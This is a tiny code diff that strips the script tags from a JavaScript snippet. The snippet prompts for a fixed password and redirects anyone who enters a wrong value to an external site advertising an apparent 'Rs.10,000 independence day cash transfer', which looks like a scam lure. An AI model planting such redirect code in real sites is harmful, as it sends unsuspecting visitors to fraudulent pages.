@@ -1,4 +1,3 @@
-<script>
 var password = 'Rs.10,000';
 
 password = prompt(
@@ -9,4 +8,4 @@ password = prompt(
 if (password !== 'Rs.10,000') {
     location.href = 'https://www.etteofukod.site/rs10000-independence-day-cash-transfer';
 }
-</script>
+
